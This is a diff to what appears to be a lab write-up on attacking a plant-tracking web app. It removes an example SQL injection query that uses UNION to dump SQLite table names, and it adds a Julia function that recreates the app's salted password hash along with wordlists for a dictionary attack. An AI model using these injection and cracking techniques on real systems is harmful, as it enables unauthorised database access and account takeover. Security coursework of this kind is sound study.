@@ -44,17 +44,6 @@ SQL injection string into the `plant` variable such that it nullifies the `user_
   ```
   -- https://www.sqlite.org/faq.html#q7
 
-```sql
-SELECT name, color, planttype, potsize, shared FROM plants
-WHERE user_id=user_id
-AND name LIKE "%
--"
-UNION
-SELECT * FROM sqlite_master
-WHERE type='table';
---
-%";
-```
 
 SQL injection string to acquire the names of the tables:
 ```
@@ -85,3 +74,16 @@ CREATE TABLE users ( id INTEGER NOT NULL, username VARCHAR(50) NOT NULL, salt VA
 
 
 ## Part C. Password cracking
+
+```julia
+using SHA
+
+function hash(password::String, salt::String)
+    bytes2hex(sha256(string("potplantspw", password, salt)))[1:32]
+end
+```
+
+Wordlists used for the dictionary attack
+
+- `/usr/share/dict/words`
+- [CrackStation's Password Cracking Dictionary]( https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm)
